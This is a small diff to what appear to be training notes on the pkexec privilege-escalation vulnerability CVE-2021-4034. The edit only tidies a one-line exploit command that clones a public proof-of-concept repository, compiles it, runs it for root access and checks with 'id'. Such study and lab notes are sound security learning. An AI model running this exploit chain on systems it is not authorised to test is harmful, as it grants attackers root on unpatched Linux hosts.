@@ -45,7 +45,7 @@ pkexec memory corruption vulnerability via [CVE-2021-4034](https://cve.mitre.org
 Exploit
 
 ```python
-git clone https://github.com/arthepsy/CVE-2021-4034.git; cry0l1t3@nix02:~$ cd CVE-2021-4034; gcc cve-2021-4034-poc.c -o poc; ./poc; id
+git clone https://github.com/arthepsy/CVE-2021-4034.git; cd CVE-2021-4034; gcc cve-2021-4034-poc.c -o poc; ./poc; id
 ```
 
 ## Questions
